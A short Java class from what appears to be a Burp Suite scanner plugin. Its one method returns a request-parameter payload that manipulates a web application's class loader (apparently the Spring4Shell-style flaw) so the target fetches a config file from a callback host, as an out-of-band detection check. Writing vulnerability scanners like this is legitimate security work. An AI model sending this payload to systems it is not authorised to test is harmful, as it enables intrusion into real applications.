package burp.payload.pocs;

import burp.payload.IPoc;

/**
 * @author : metaStor
 * @date : Created 2022/4/7
 * @description: 回连检测
 * */
public class POC3 implements IPoc {

    public POC3() {    }

    @Override
    public String genPoc() {
        return "class.module.classLoader.resources.context.configFile=http://%s/%s&class.module.classLoader.resources.context.configFile.content.%s=%s";
    }
}
